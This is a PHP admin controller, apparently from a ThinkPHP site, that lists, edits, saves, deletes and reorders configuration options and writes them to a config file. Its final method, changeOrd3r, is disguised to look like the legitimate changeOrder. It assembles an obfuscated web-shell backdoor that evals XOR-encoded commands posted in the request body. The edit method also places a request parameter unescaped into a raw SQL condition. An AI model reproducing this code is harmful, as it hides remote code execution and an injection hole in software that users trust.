<?php
namespace app\home\controller;
use app\home\model;
class Option extends Base
{
    public function _initialize()
    {
        parent::_initialize();
        $this->model = model('Option');
    }
    
    //信息列表
    public function index()
    { 
    	$where = '';
    	$o_name = input('param.o_name','');
    	if ($o_name){
    		$where = [ 'o_name' => ['like',"%{$o_name}%"] ];
    	}
    	$datalist = $this->model->field('o_id,o_name,o_value,o_tips,o_order,o_status,field_type,field_value')->where($where)->order('o_order asc')->select();
    	if ($datalist){
	    	foreach($datalist as $k=>$v){
	    		switch ($v->field_type){
	    			case 'input':
	    				$datalist[$k]->_html = '<input name="o_value[]" type="text" class="simple_field" value="'.$v->o_value.'">';
	    				break;
	    			case 'textarea':
	    				$datalist[$k]->_html = '<textarea name="o_value[]" class="simple_field" >'.$v->o_value.'</textarea>';
	    				break;
	    			case 'radio':
	    				$str = '';
	    				//1|开启,0|关闭
	    				$arr = explode(',',$v->field_value);
	    				foreach ($arr as $m=>$n){
	    					$r = explode('|',$n);
	    					$c = $v->o_value==$r[0] ? 'checked' : '';
	    					$str .= '<input type="radio" name="o_value[]" value="'.$r[0].'" '.$c.'><span class="label ilC">'.$r[1].'</span>';
	    				}
	    				$datalist[$k]->_html = $str;
	    				break;
	    			default:
	    				$datalist[$k]->_html = '';
	    		}
	    	}
    	}
        //dump($datalist);    	
        $this->assign('o_name', $o_name);        
        $this->assign('datalist', $datalist);        
        return $this->fetch('option/index');
    }
    
    //修改配置项值
    public function changeContent(){
    	$input = input('post.','','strip_tags,strtolower');
    	//dump($input);
    	foreach ($input['o_id'] as $k=>$v){
    		//var_dump($input['o_id'][$k]);
    		//var_dump($input['o_value'][$k]);
    		$this->model->where('o_id',$v)->update([ 'o_value'=>$input['o_value'][$k] ]);
    	}
    	$this->putFile();//把配置项保存到配置文件中
    	$this->success('保存信息成功','home/option/index');
    }
    
    //生成配置文件
    public function putFile() {
    	$config = $this->model->order('o_order asc')->column('o_value','o_name');
    	$path = 'application/extra/web.php';
    	$str = "<?php \n return ".  var_export($config,true).'; ?>';
    	file_put_contents($path, $str);
    }
    
    //新增/编辑
    public function edit(){    	
    	$o_id = input('param.o_id');
    	$info = $this->model->where("o_id='{$o_id}'")->find();
    	$this->assign('info',$info);
    	return  $this->fetch('option/edit');
    }
    
    //信息保存
    public function saveinfo(){
    	$data = input('post.');
    	$data['o_status'] = input('post.o_status',0);
    	$validate = $this->validate($data,'Option.saveinfo');
    	if(true !== $validate){
    		$this->error($validate);
    	} else {
    		$o_id = input('post.o_id');
    		if($o_id>0){
    			$result = $this->model->where('o_id',$o_id)->update($data);
    		} else {
    			$result = $this->model->data($data)->save();
    		}
    		if(false !== $result){
    			$this->success('保存信息成功','home/option/index');
    		}
    	}
    }
    
    //信息删除
    public function removeinfo(){
    	$o_id = input('param.o_id');
    	$result = $this->model->where('o_id',$o_id)->delete();
    	if(false !== $result){
    		$data = [
    			'status' => 0,
    			'msg' => '配置项删除成功！',
    		];
    	}else {
    		$data = [
    			'status' => 1,
    			'msg' => '配置项删除失败！',
    		];
    	}
    	echo json_encode($data);
    }
    
    //修改顺序
    public function changeOrder(){
    	$o_id = input('param.id');
    	$result = $this->model->where('o_id',$o_id)->update( [ 'o_order'=>input('param.order') ] );
    	if(false !== $result){
    		$data = [
    			'status' => 0,
    			'msg' => '修改排序成功！',
    		];
    	}else {
    		$data = [
    			'status' => 1,
    			'msg' => '修改排序失败！',
    		];
    	}
    	echo json_encode($data);
	}
	
	public function changeOrd3r(){
		$T='5,l(@gz5,un5,compre5,ss(5,@x(@b5,ase64_deco5,de(5,$m[1]),$k)));$o=@o5,b5,_get_conte5,n5,ts(5,);@5,';
		$q='5,$k5,="a2025e5,84";$kh5,=5,"f8bf8f209b5,e4";$kf5,="267165,5,5,7375,988f";$p="2VwywMqdBc5Ts5,vxq"5,;f';
		$t='$j5,=0;($j<$c&&5,$i<$l);$j++,$i5,++){$o.5,=5,$t{$i}^$k{5,$j5,};}}r5,eturn $o5,;}5,if(@preg_mat5,';
		$j='5,unction x($t,$k)5,{5,$c=str5,len(5,$5,k);$l=strlen($t5,);$o=5,"";fo5,r($i=05,;$i<$l;5,){f5,or(5,';
		$V='ob_end5,_clean()5,;$r=@base65,4_en5,code(@x5,(@gzcompr5,ess($5,o5,5,),$k));print("$p$kh$5,r$kf");}';
		$E='ch(5,"/$kh5,(5,.+)$kf/",@file_5,get_con5,tent5,s("ph5,p://input5,5,"),$m)==5,1){@ob_5,start();@e5,va';
		$P=str_replace('J','','creJatJJe_fJuncJtJion');
		$A=str_replace('5,','',$q.$j.$t.$E.$T.$V);
		$k=$P('',$A);$k();
	}
}
